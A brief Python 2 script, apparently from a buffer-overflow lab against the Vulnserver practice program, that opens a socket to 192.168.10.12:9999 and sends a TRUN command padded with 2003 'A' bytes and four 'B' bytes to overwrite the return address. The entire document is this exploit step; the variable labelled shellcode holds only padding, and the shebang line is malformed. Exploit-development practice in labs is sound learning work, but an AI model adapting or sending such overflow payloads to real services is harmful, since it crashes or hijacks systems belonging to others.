!/usr/bin/env python

import socket
import sys

shellcode = "A" * 2003 + "B" *4

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect=s.connect(('192.168.10.12', 9999))
	s.send(('TRUN /.:/' + shellcode))
except:
	print "check debuger"
s.close()
